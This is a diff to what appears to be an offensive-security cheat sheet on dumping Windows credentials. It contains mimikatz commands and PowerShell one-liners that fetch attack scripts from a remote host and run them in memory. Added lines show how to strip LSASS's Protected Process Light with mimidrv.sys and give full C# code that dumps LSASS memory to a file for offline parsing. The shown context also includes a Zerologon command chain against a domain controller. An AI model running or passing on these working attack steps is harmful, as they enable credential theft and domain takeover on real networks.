@@ -19,6 +19,7 @@ token::elevate
 privilege::debug
 log
 sekurlsa::logonpasswords
+ # IF ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) --> Need bypass PPL
 lsadump::sam
 lsadump::secrets
 lsadump::cache
@@ -30,7 +31,73 @@ powershell -ep bypass -nop -c "iex (iwr http://IP/Invoke-PowerDump.ps1 -UseBasic
 powershell -ep bypass -nop -c "iex (iwr http://IP/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"'"
 ```
 
-* If mimikatz is not dumping out required hashes/passwords, can try `mimikatz_2_1_1_x64.exe` (version 2.1.1). From [here](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz\_trunk.zip).
+* If mimikatz is not dumping out required hashes/passwords, can try `mimikatz_2_1_1_x64.exe` (version 2.1.1). From [here](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip).
+
+</details>
+
+<details>
+
+<summary>Getting Past Protected Process Light (PPL) for Mimikatz</summary>
+
+* Detecting LSASS executing as Protected Process Light?
+
+```
+mimikatz # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+```
+
+* How to workaround?
+  * Must download mimidrv.sys in the same folder as mimikatz.exe&#x20;
+
+<pre><code><strong>mimikatz # !+
+</strong>mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # sekurlsa::logonpasswords)
+</code></pre>
+
+</details>
+
+<details>
+
+<summary>Mimikatz from dmp file</summary>
+
+<pre><code><strong>using System;
+</strong>using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace MiniDump
+{
+    class Program
+    {
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
+          IntPtr hFile, int DumpType, IntPtr ExceptionParam,
+          IntPtr UserStreamParam, IntPtr CallbackParam);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
+          int processId);
+
+        static void Main(string[] args)
+        {
+            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
+            Process[] lsass = Process.GetProcessesByName("lsass");
+            int lsass_pid = lsass[0].Id;
+
+            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
+            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+        }
+    }
+}
+</code></pre>
+
+* Release --> x64 --> .\Minidump.exe from local admin account&#x20;
+* Lsass.dmp is saved in C:\Windows\tasks
+
+```
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
 
 </details>
 
@@ -135,7 +202,7 @@ python dementor.py -u Guest -p ''  <target> <responder>
 
 * Quick Win
 
-[https://github.com/risksense/zerologon/blob/master/set\_empty\_pw.py](https://github.com/risksense/zerologon/blob/master/set\_empty\_pw.py)
+[https://github.com/risksense/zerologon/blob/master/set\_empty\_pw.py](https://github.com/risksense/zerologon/blob/master/set_empty_pw.py)
 
 <pre class="language-bash"><code class="lang-bash">python3 set_empty_pw.py DC01 192.168.194.165
 <strong>secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
